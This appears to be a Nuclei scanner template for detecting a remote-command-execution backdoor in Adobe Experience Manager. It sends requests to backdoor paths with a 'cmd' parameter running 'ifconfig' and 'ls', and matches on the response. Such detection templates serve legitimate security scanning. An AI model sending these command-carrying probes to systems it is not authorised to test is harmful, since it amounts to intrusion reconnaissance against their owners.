id: rce-aem

info:
  name: aem rce
  author: ELSFA7110
  severity: critical
  reference: https://twitter.com/sec715/status/1397924997457317897
  tags: rce,exposure

requests:
  - method: GET
    path:
      - "{{BaseURL}}/rcenode.html?cmd=ifconfig"
      - "{{BaseURL}}/bin/backdoor.html?cmd=ls"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "ifconfig"
          - "ls"
        part: body

      - type: status
        status:
          - 200
